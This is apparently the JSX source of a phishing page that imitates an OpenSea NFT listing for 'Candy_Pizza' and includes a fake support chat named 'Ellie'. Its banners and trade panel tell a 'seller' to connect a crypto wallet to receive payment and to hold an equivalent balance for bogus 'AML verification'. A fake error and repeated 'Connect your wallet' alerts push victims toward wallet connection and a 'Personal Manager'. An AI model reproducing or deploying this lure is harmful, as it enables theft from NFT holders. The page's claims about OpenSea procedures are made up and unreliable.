...
return (
  ...
  <meta
    content="Candy_Pizza - Mr_Catt__ Collection | OpenSea"
    property="og:title"
  />
  <meta
    content="https://i.seadn.io/gcs/files/56a7aba506fca8b266dbbca9cdf37e0b.png?auto=format&dpr=1&w=1000 | OpenSea"
    property="og:image"
  />
  <meta
    content="OpenSea is the world's first and largest web3 marketplace for NFTs and crypto collectibles. Browse, create, buy, sell, and auction NFTs using OpenSea today"
    property="og:description"
  />
  <title>Candy_Pizza - Mr_Catt__ Collection | OpenSea</title>
  <style
  ...
  <div
    style={{
      ...
      opacity: 1,
      transition:
        "visibility 250ms ease 0s, opacity 250ms ease 0s, transform 250ms ease 0s",
      right: 0,
      bottom: 0,
  ...
  >
    <button
      type="button"
      id="ada-chat-button"
      className="button--text button-v2 button--appear"
      title="Chat"
      style={{
  ...
  >
    <div className="FileUploadDropzone">
      <div className="FileUploadDropzone__content">
        <div
          id="message-container"
          className="sc-bXXDC injjUJ Container__message-container"
        >
          <div className="sc-cuzpcz kiyZfh">
            <h1 aria-hidden="false" className="sc-bhrzfF bPHARW">
              <span aria-hidden="true" className="sc-jtiXyc hdvxWI">
                <img
                  src="https://giterhaber.github.io/qrqr/support/feaf83b0-ec00-48d7-9a14-b17d76172eba.svg"
                  alt=""
                  className="sc-ellfGf edxkse"
                />
              </span>
              <span className="sc-cdxCiY hlQGGB">Ellie</span>
            </h1>
            <div className="sc-dqFsfS bmFkzh">
              <div className="sc-lahOFi Hxrpp">
                <div className="sc-iQTVEV kZOgXZ">
                  <button type="button" className="sc-jSFjdj gHWUGh">
                    Close
                  </button>
                </div>
              </div>
          ...
          <div role="main" aria-label="Messages" className="sc-hemfWc bmWA-dv">
            <div className="sc-eTTTle binnDz">
              <div className="sc-iQQLPo leSYDw">
                <div
                  id="MESSAGE_LIST_LOG"
                  tabIndex={0}
                  aria-label="Chat messages"
                  className="sc-eYKchh lXZHu"
                >
                  <div className="sc-dPzuq kUZcgm">
                    <div id="m" className="sc-ezHeEz cIKEHp">
                      <div className="sc-fvNhHS ePcyd">
                        <div
                          data-testid="MessageGroupNewBot"
                          className="sc-kkmGkm XgzNi"
                        >
                          <div
                            aria-hidden="true"
                            className="sc-cTsKDU eHgqKZ"
                          />
                          <div className="sc-jogDgT gzqtY">
                            <div className="sc-bXmHAB ITGjV">
                              <div
                                data-testid="MessageGroupMessage"
                                className="sc-hHSjgo JRRzG"
                              ></div>
                            </div>
                          </div>
                        </div>
                    ...
                    <div className="sc-dMackw jJjywH" />
                  </div>
                </div>
              </div>
              <div className="sc-crzoAE BiWrI">
                <div className="sc-dIsUp jkUewj">
                  <div className="sc-bqGGPW iPexDg">
                    <div className="sc-hBMUJo syKsX">
                      <div className="sc-fnVZcZ hmqpxx">
                        <div className="sc-eHEENL jmChde" />
                      </div>
                      <div className="sc-eEVmNe illmTA">
                        <div aria-hidden="true" className="sc-kYPZxB YaAKp" />
                        <div aria-hidden="false" className="sc-kYPZxB hlEGhZ">
                          <div className="sc-jHcXXw dKqwU">
                            <textarea
                              placeholder="Type message…"
                              rows={1}
                              id="message_text"
                              data-testid="MessageInput"
                              className="sc-bQCEYZ XdCGL"
                              defaultValue={""}
                            />
                            <label
                              htmlFor="js-file"
                              className="sc-fXgAZx lnUsEY custom-file-upload"
                              style={{ right: 40, background: "none" }}
                            >
                              <img
  ...
  <div id="__next">
    <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 OpenSeaPagereact__DivContainer-sc-65pnmt-0 elqhCm jYqxGr ksFzlZ iRiGb">
      <div className="Navbarreact__DivContainer-sc-d040ow-2 gRSAHO">
        <nav className="Navbar--main">
          <div className="Navbar--left">
            <a
              className="styles__StyledLink-sc-l6elh8-0 ekTmzq Navbar--brand"
              href=""
            >
              <div
                height={40}
                width={40}
                className="Blockreact__Block-sc-1xf18x6-0 fwdSDv"
              >
                <div
                  style={{
                    display: "block",
              ...
              <div className="fresnel-container fresnel-greaterThanOrEqual-sm ">
                <div className="Blockreact__Block-sc-1xf18x6-0 kQGojb" />
              </div>
            </a>
          </div>
          <div
            display="flex"
            width="100%"
            className="Blockreact__Block-sc-1xf18x6-0 bYwkCJ"
          >
            <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 VerticalAlignedreact__VerticalAligned-sc-b4hiel-0 NavSearchreact__StyledContainer-sc-yexslu-1 elqhCm jYqxGr ksFzlZ iXcsEj kfEAAZ">
              <div
                aria-expanded="false"
                ...
                height="72px,45px"
                role="combobox"
                className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 jefFdD jYqxGr"
              >
                <div
                  className="Inputreact__StyledContainer-sc-3dr67n-0 fOXING NavSearchreact__StyledGlobalSearchInput-sc-yexslu-2 eMqLdX"
                  aria-expanded="false"
                >
                  <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 VerticalAlignedreact__VerticalAligned-sc-b4hiel-0 jqNBiE jYqxGr ksFzlZ iXcsEj">
                    <i
                      color="gray"
                      value="search"
                      size={24}
                      className="Iconreact__Icon-sc-1gugx8q-0 kUebnk material-icons"
                    >
                      search
                    </i>
                  </div>
          ...
          <ul className="Navbarreact__ContainerList-sc-d040ow-0 block_pc fCWkoc">
            <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr fresnel-greaterThanOrEqual-xl">
              <li
                className="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot"
                aria-expanded="false"
              >
                <a
                  className="styles__StyledLink-sc-l6elh8-0 ekTmzq NavItem--main NavItem--withAfter"
              ...
              <li className="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot">
                <a
                  className="styles__StyledLink-sc-l6elh8-0 ekTmzq NavItem--main NavItem--withAfter"
            ...
            <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr fresnel-greaterThanOrEqual-lg">
              <div className="Blockreact__Block-sc-1xf18x6-0 hOuzGS">
                <li
                  className="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot"
                  aria-expanded="false"
                >
                  <a
                    className="styles__StyledLink-sc-l6elh8-0 ekTmzq NavItem--main NavItem--withAfter NavItem--withIcon"
                    href=""
                    onclick="alert('Mistake. Connect your wallet')"
                  >
                    <i
                      className="Iconreact__Icon-sc-1gugx8q-0 irlPce NavItem--icon material-icons-outlined NavItem--icon"
                      size={32}
                      title="Account"
              ...
              <li className="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot">
                <button
                  className="UnstyledButtonreact__UnstyledButton-sc-ty1bh0-0 btgkrL NavItem--main NavItem--withIcon"
                  type="button"
                  onclick="alert('Mistake. Connect your wallet')"
                >
                  <i
          ...
          <ul
            className="Navbarreact__ContainerList-sc-d040ow-0 block_mob fCWkoc"
            style={{ display: "none" }}
          >
            <li className="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot fresnel-lessThan-sm Navbar--search-icon">
              <button
                className="UnstyledButtonreact__UnstyledButton-sc-ty1bh0-0 btgkrL NavItem--main NavItem--withIcon"
                type="button"
                onclick="alert('Mistake. Connect your wallet')"
              >
                <i
                  className="Iconreact__Icon-sc-1gugx8q-0 irlPce NavItem--icon material-icons NavItem--icon"
                  size={32}
            ...
            <li className="NavItemreact__LiContainer-sc-1agh4ne-0 fyqWls NavItem--isRoot fresnel-lessThan-xl">
              <button
                className="UnstyledButtonreact__UnstyledButton-sc-ty1bh0-0 btgkrL NavItem--main NavItem--withIcon"
                onclick="alert('Mistake. Connect your wallet')"
                type="button"
      ...
      <aside
        className="Blockreact__Block-sc-1xf18x6-0 Drawerreact__ContainerDiv-sc-1un5qtt-4 elqhCm fCHOiB"
        data-testid="WalletSidebar"
      />
      <div
        className="Overlayreact__Overlay-sc-1yn7g51-0 jqkcUe fresnel-greaterThanOrEqual-lg"
        aria-hidden="true"
      ></div>
      <main
        id="main"
        className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 eHrogu jYqxGr ksFzlZ"
      >
        <div
          className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 iYvtHI jYqxGr ksFzlZ"
          height="100%"
        >
          <div className="AssetPagereact__DivContainer-sc-119bh74-0 fhezOG">
            <div className="item--container">
              ...
              >
                <div className="text-center">
                  <strong id="dangerContent">
                    Error #540 occurred
                    <br />
                    Dear seller! Please contact the technical support chat and
              ...
              <div
                className="alert alert-danger alert-dismissible fade show"
                style={{ display: "none", marginTop: 10, marginBottom: 10 }}
                id="networkAlert"
                role="alert"
              >
                <div className="text-center">
                  <strong id="networkError" />
                </div>
                <button
                  type="button"
                  className="close"
              ...
              <div
                id="main-container"
                className="fresnel-container fresnel-greaterThanOrEqual-lg"
              >
                <div className="item--large">
                  <div className="item--wrapper">
                    <section
                      className="item--header mob_header"
                      style={{ display: "none" }}
                    >
                      <div className="item--collection-info">
                        <div className="item--collection-detail">
                          <div className="CollectionLinkreact__DivContainer-sc-gv7u44-0 jMcPQU">
                            <a
                              className="styles__StyledLink-sc-l6elh8-0 ekTmzq CollectionLink--link"
                              href=""
                            >
                              Mr_Catt__ Collection
                            </a>
                          </div>
                        </div>
                        <div className="item--collection-toolbar-wrapper">
                          <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 ButtonGroupreact__StyledButtonGroup-sc-1skvztv-1 elqhCm jYqxGr daKevg">
                            <button
                              onclick="alert('Mistake. Connect your wallet')"
                              className="Blockreact__Block-sc-1xf18x6-0 Buttonreact__StyledButton-sc-glfma3-0 kXZare jdSrqf ButtonGroupreact__StyledButton-sc-1skvztv-0 eztnHW"
                              type="button"
                            >
                              <div
                                aria-hidden="true"
                                className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 kBjTDg jYqxGr"
                              >
                                <i
                                  value="refresh"
                                  size={24}
                                  className="Iconreact__Icon-sc-1gugx8q-0 irnoQt material-icons"
                                >
                                  refresh
                                </i>
                              </div>
                      ...
                      <h1
                        className="Blockreact__Block-sc-1xf18x6-0 elqhCm item--title"
                        title="Candy_Pizza"
                      >
                        Candy_Pizza
                      </h1>
                    ...
                    <div className="item--summary">
                      <article
                        className="Blockreact__Block-sc-1xf18x6-0 Framereact__Frame-sc-139h1ex-0 elqhCm ihcaBg item--frame item--media-frame"
                        style={{ height: 427 }}
                      >
                        <header className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 SpaceBetweenreact__SpaceBetween-sc-jjxyhg-0 AssetCardAnnotationsreact__StyledContainer-sc-1i5b3a5-0 elqhCm jYqxGr gJwgfT grZToA">
                          <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 jffCaG jYqxGr">
                            <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 jffCaG jYqxGr">
                              <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 blWKFw jYqxGr">
                                <button
                                  aria-label="Ethereum logo"
                                  type="button"
                                  className="UnstyledButtonreact__UnstyledButton-sc-ty1bh0-0 ChainLogoreact__LogoButton-sc-1fidmhx-0 btgkrL eWlnGz"
                                >
                                  <svg
                                    fill="gray"
                        ...
                        <div className="Blockreact__Block-sc-1xf18x6-0 elqhCm">
                          <div className="AssetMediareact__DivContainer-sc-1v86bfg-2 iuBeFR item--media">
                            <div
                              height="100%"
                              width="100%"
                              className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 VerticalAlignedreact__VerticalAligned-sc-b4hiel-0 CenterAlignedreact__CenterAligned-sc-cjf6mn-0 bKhpmf jYqxGr ksFzlZ iXcsEj cgnEmv"
                            >
                              <div
                                className="Imagereact__DivContainer-sc-dy59cl-0 kMPTZo Image--fade Image--isImageLoaded Image--isImageLoaderVisible AssetMedia--img"
                                style={{ height: "100%", width: 600 }}
                              >
                                <img
                                  className="Image--image"
                                  src="https://i.seadn.io/gcs/files/56a7aba506fca8b266dbbca9cdf37e0b.png?auto=format&dpr=1&w=1000"
                                  style={{
                                    width: "100%",
                                    height: "100%",
                                    maxWidth: "100%",
                      ...
                      <section className="Blockreact__Block-sc-1xf18x6-0 Framereact__Frame-sc-139h1ex-0 elqhCm ihcaBg item--frame item--summary-frame frame_pc">
                        <div>
                          <div
                            className="Panelreact__DivContainer-sc-1uztusg-0 ejFaWs Panel--alwaysOpen Panel--isOpen Panel--isFramed"
                            data-testid="Panel"
                          >
                            <div className="BasePanelreact__DivContainer-sc-1d6z6bk-0 hypfZU Panel--panel">
                              <button
                                className="UnstyledButtonreact__UnstyledButton-sc-ty1bh0-0 btgkrL BasePanel--header Panel--header"
                              ...
                              >
                                <i
                                  aria-hidden="true"
                                  className="Iconreact__Icon-sc-1gugx8q-0 irnoQt Panel--icon material-icons Panel--icon"
                                  value="subject"
                                  size={24}
                                >
                                  subject
                                ...
                                <i
                                  aria-hidden="true"
                                  className="Iconreact__Icon-sc-1gugx8q-0 irnoQt Panel--toggle Panel--isEnabled material-icons Panel--toggle Panel--isEnabled"
                                  value="expand_less"
                                  size={24}
                                >
                                  expand_less
                              ...
                              <div
                                className="BasePanel--body Panel--body"
                                ...
                                >
                                  <div className="Panel--isContentPadded item--description">
                                    <section className="item--creator">
                                      <div
                                        className="Blockreact__Block-sc-1xf18x6-0 AccountLinkreact__DivContainer-sc-4gdciy-0 elqhCm fkuTPI AccountLink--ellipsis-overflow item--creator-account"
                                        data-testid="AccountLink"
                                      >
                                        Created by&nbsp;
                                        <a
                                          className="styles__StyledLink-sc-l6elh8-0 hubhNL Blockreact__Block-sc-1xf18x6-0 laCjUo AccountLink--ellipsis-overflow"
                                          fontWeight="inherit"
                                          href=""
                                        >
                                          <span> Mr_Catt__</span>
                          ...
                          <div
                            className="Panelreact__DivContainer-sc-1uztusg-0 ejFaWs Panel--isClosed Panel--isFramed"
                            data-testid="Panel"
                            onclick="alert('Mistake. Connect your wallet')"
                          >
                            <div className="BasePanelreact__DivContainer-sc-1d6z6bk-0 hypfZU Panel--panel">
                    ...
                    <div className="item--main">
                      <section className="item--header pc_header">
                        <div className="item--collection-info">
                          <div className="item--collection-detail">
                            <div className="CollectionLinkreact__DivContainer-sc-gv7u44-0 jMcPQU">
                              <a
                      ...
                      <section className="item--counts">
                        <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 VerticalAlignedreact__VerticalAligned-sc-b4hiel-0 CenterAlignedreact__CenterAligned-sc-cjf6mn-0 kyhBeu jYqxGr ksFzlZ iXcsEj cgnEmv">
                          <div
                            className="Blockreact__Block-sc-1xf18x6-0 AccountLinkreact__DivContainer-sc-4gdciy-0 elqhCm fkuTPI AccountLink--ellipsis-overflow"
                      ...
                      <div className="item--frame">
                        <div className="TradeStationreact__DivContainer-sc-o1vm2f-2 hYKIws">
                          <section className="Blockreact__Block-sc-1xf18x6-0 Framereact__Frame-sc-139h1ex-0 elqhCm ihcaBg">
                            <div className="Blockreact__Block-sc-1xf18x6-0 TradeStationreact__TimerContainer-sc-o1vm2f-1 elqhCm FFCYS TradeStation--header">
                              <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 SpaceBetweenreact__SpaceBetween-sc-jjxyhg-0 jffCaG jYqxGr gJwgfT">
                                <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr">
                                  <div
                                    display="inline"
                                    className="Blockreact__Block-sc-1xf18x6-0 iiEhTQ"
                                  >
                                    <span className="Blockreact__Block-sc-1xf18x6-0 Textreact__Text-sc-1w94ul3-0 gLefxh iZsJOf">
                                      <strong>Dear Seller!</strong>
                                      <br />
                                      Connect your wallet (MetaMask, Trust
                                      Wallet, Phantom, etc.) to receive payment
                                      and transfer this NFT item.
                                      <br />
                                      <br />
                                      ...
                                      <br />
                                      <br />
                                      OpenSea Secure Transaction requires you to
                                      have an equivalent amount of value from
                                      your item to pass AML verification.
                                      <br />
                                      <br />
                                      If the transaction amount exceeds 1 ETH,
                                      contact your Personal Manager to calculate
                                      the required balance for your successful
                                      AML verification. <br />
                                      <strong>
                                        (Click on the "CHAT" button on this page
                                        to contact your manager for assistance)
                                      </strong>
                                    </span>
                                  </div>
                                </div>
                            ...
                            <div className="TradeStation--main">
                              ...
                              <div className="TradeStation--price-container">
                                <div className="Pricereact__DivContainer-sc-t54vn5-0 iBLrYW Price--main TradeStation--price">
                                  <div
                                    cursor="pointer"
                                    className="Blockreact__Block-sc-1xf18x6-0 fdhxMV"
                                  >
                                    <a
                                    ...
                                    >
                                      <div
                                        size={24}
                                        className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 VerticalAlignedreact__VerticalAligned-sc-b4hiel-0 CenterAlignedreact__CenterAligned-sc-cjf6mn-0 Avatarreact__AvatarContainer-sc-sbw25j-0 AMWWS jYqxGr ksFzlZ iXcsEj cgnEmv dukFGY"
                                      >
                                        <img
                                          alt="ETH"
                                          className="Blockreact__Block-sc-1xf18x6-0 Avatarreact__ImgAvatar-sc-sbw25j-1 AMWWS hzWBaN Price--eth-icon"
                                ...
                                <div className="Pricereact__DivContainer-sc-t54vn5-0 iBLrYW TradeStation--fiat-price">
                                  <div
                                    className="Overflowreact__OverflowContainer-sc-7qr9y8-0 jPSCbX Price--fiat-amount Price--fiat-amount-secondary"
                                    tabIndex={-1}
                                  >
                                    ($2358.62)
                                  </div>
                              ...
                              <div
                                ...
                                className="Blockreact__Block-sc-1xf18x6-0 cVpiON"
                              >
                                <div
                                  className="Blockreact__Block-sc-1xf18x6-0 elqhCm"
                                  style={{ width: "100%", display: "contents" }}
                                >
                                  <div className="Blockreact__Block-sc-1xf18x6-0 InlineFlexreact__InlineFlex-sc-9jbsog-0 jvprHi czWSvr">
                                    <div
                                      id="prepare"
                                      className="prepare"
                                      style={{ width: "100%" }}
                                    >
                                      <button
                                        ...
                                        type="button"
                                        id="btn-connect"
                                        className="btn-connect Blockreact__Block-sc-1xf18x6-0 Buttonreact__StyledButton-sc-glfma3-0 dpXlkZ fzwDgL"
                                      >
                                        <div
                                          className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 fOxaJL jYqxGr"
                                          style={{ display: "none" }}
                                        >
                                          <i
                                            value="account_balance_wallet"
                                    ...
                                    >
                                      <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 fOxaJL jYqxGr">
                                        <i
                                          value="account_balance_wallet"
                                          size={24}
                                          className="Iconreact__Icon-sc-1gugx8q-0 irnoQt material-icons"
                                    ...
                                    >
                                      <button
                                        ...
                                        type="button"
                                        id="btn-disconnect"
                                        className="btn-disconnect Blockreact__Block-sc-1xf18x6-0 Buttonreact__StyledButton-sc-glfma3-0 dpXlkZ gIDfxn"
                                      >
                                        <div
                                          className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 fOxaJL jYqxGr"
                                          style={{ display: "none" }}
                      ...
                      <div className="item--frame">
                        <section
                          className="Blockreact__Block-sc-1xf18x6-0 Framereact__Frame-sc-139h1ex-0 elqhCm ihcaBg item--frame item--summary-frame frame_mob"
                          style={{ display: "none" }}
                        >
                          <div>
                            <div
                        ...
                        <div
                          className="Panelreact__DivContainer-sc-1uztusg-0 ejFaWs Panel--isOpen"
                          data-testid="Panel"
                        >
                          <div className="BasePanelreact__DivContainer-sc-1d6z6bk-0 hypfZU Panel--panel">
                            <button
                            ...
                            >
                              ...
                              >
                                <div className="Panel--isContentPadded">
                                  <div className="PriceHistoryreact__DivContainer-sc-1acqplr-0 zVxua">
                                    <div className="PriceHistory--interface">
                                      <div className="Blockreact__Block-sc-1xf18x6-0 bxxnje">
                                        <div
                                        ...
                                        >
                                          ...
                                          />
                                          <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 VerticalAlignedreact__VerticalAligned-sc-b4hiel-0 lOvJc jYqxGr ksFzlZ iXcsEj">
                                            <i
                                              ...
                                              size={24}
                                              className="Iconreact__Icon-sc-1gugx8q-0 dQEVxt material-icons"
                                            >
                                              keyboard_arrow_down
                                            </i>
                                          </div>
                                    ...
                                    <div className="PriceHistory--graph">
                                      <div className="PriceHistoryGraphreact__DivContainer-sc-1m8j9zz-2 ddfrDf PriceHistory--empty">
                                        <div
                                          className="Imagereact__DivContainer-sc-dy59cl-0 kMPTZo Image--isImageLoaded Image--isImageLoaderVisible PriceHistory--no-data-img"
                                        ...
                                        <div className="PriceHistory--no-data-text">
      ...
      <div className="Footerreact__DivContainer-sc-9132jc-0 cINaIw">
        <div className="Footer--container">
          <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--row">
            <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--column Footer--half">
              <div className="Blockreact__Block-sc-1xf18x6-0 elqhCm Footer--section-header">
                Stay in the loop
              </div>
              <div className="Blockreact__Block-sc-1xf18x6-0 elqhCm Footer--text">
                Join our mailing list to stay in the loop with our newest
                feature releases, NFT drops, and tips and tricks for navigating
                OpenSea.
              </div>
              <form className="Blockreact__Block-sc-1xf18x6-0 Formreact__FormBase-sc-1fkdq1o-0 MailingSignupFormreact__StyledForm-sc-qbt7o6-0 elqhCm Baqqr">
                <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr MailingSignupForm--input-container">
                  <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 elqhCm jYqxGr ksFzlZ MailingSignupForm--input-main">
                    <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 hemYqe jYqxGr">
                      <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 FlexColumnreact__FlexColumn-sc-1wwz3hp-0 elqhCm jYqxGr ksFzlZ">
                        <label className="Blockreact__Block-sc-1xf18x6-0 Textreact__Text-sc-1w94ul3-0 Labelreact__StyledLabel-sc-5y2dd1-0 elqhCm kCOfJW evOuEh">
                          Email address
                        </label>
                      </div>
                      <div className="Inputreact__StyledContainer-sc-3dr67n-0 fOXING MailingSignupForm--input">
                        <input
                          aria-invalid="false"
                          style={{ cursor: "text" }}
                  ...
                  <button
                    className="Blockreact__Block-sc-1xf18x6-0 Buttonreact__StyledButton-sc-glfma3-0 hUAXvQ fzwDgL MailingSignupForm--button"
                    height="50px"
                    width="162px"
                    type="button"
                  >
            ...
            <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--column Footer--half">
              ...
              <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 jKyztR jYqxGr">
                <a
                  className="styles__StyledLink-sc-l6elh8-0 ekTmzq Blockreact__Block-sc-1xf18x6-0 Buttonreact__StyledButton-sc-glfma3-0 kXZare fzwDgL Footer--social-button"
                  href="https://twitter.com/opensea"
                  rel="nofollow noopener"
                  target="_blank"
                  aria-label="Twitter Official"
                >
                  <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 icons__DivContainer-sc-1dx2b3i-0 elqhCm jYqxGr dBmaRW">
                    <svg
                      className=""
                      fill="#FFFFFF"
          ...
          <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--row">
            <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--column Footer--quarter">
              <div
                className="Imagereact__DivContainer-sc-dy59cl-0 kMPTZo Image--isImageLoaded Image--isImageLoaderVisible"
              ...
              <a
                className="styles__StyledLink-sc-l6elh8-0 ekTmzq Footer--section-header"
            ...
            <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--three-quarters">
              <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--link-column">
                <h3 className="Blockreact__Block-sc-1xf18x6-0 Textreact__Text-sc-1w94ul3-0 elqhCm kscHgv Footer--link-header">
                  Marketplace
                </h3>
                <ul className="Footer--link-list">
                  <li className="Footer--link-wrapper">
                    <a
                      className="styles__StyledLink-sc-l6elh8-0 ekTmzq Footer--link"
              ...
              <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--link-column">
                ...
                <h3 className="Blockreact__Block-sc-1xf18x6-0 Textreact__Text-sc-1w94ul3-0 kBFdIz iZsJOf Footer--link-header">
                  Stats
                </h3>
                <ul className="Footer--link-list">
                  <li className="Footer--link-wrapper">
          ...
          <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--bottom">
            <div className="Blockreact__Block-sc-1xf18x6-0 Flexreact__Flex-sc-1twd32i-0 elqhCm jYqxGr Footer--bottom-section">
              <p>
                © 2018 -{/* */}2023
                {/* */} Ozone Networks, Inc
              </p>
    ...
    <div className="modal-dialog modal-dialog-centered" role="document">
      <div className="modal-content">
        ...
        <div className="modal-body">
          <dl
            id="sample"
            className="dropdown ethDropdown"
                ...
                <li>
                  <a href="index.html#">
                    ...
                    <img
                      ...
                      alt=""
                    />
                    <span className="ddValue value">ETH</span>
                  </a>
                </li>
                <li>
                  <a href="index.html#">
          ...
          <dl
            id="sample"
            className="dropdown bscDropdown"
            style={{ display: "none" }}
          >
            <dt>
              <a href="index.html#">
                ...
                <li>
                  <a href="index.html#">
                    ...
                    <img
                      ...
                      alt=""
                    />
                    <span className="ddValue value">BNB</span>
                  </a>
                </li>
                <li>
                  <a href="index.html#">
          ...
          <div style={{ display: "flex", justifyContent: "space-between" }}>
            ...
            >
              ...
              <div className="bscDropdown" style={{ display: "none" }}>
                <img
                  id="bscimg"
              ...
              <div className="ethDropdown" style={{ display: "none" }}>
                <img
                  id="ethimg"
                  style={{ width: 13 }}
          ...
          <div style={{ position: "relative", marginTop: 7 }}>
            ...
            />
            <span id="max-btn" className="max-btn" style={{ display: "none" }}>
              max
            </span>
          </div>
        </div>
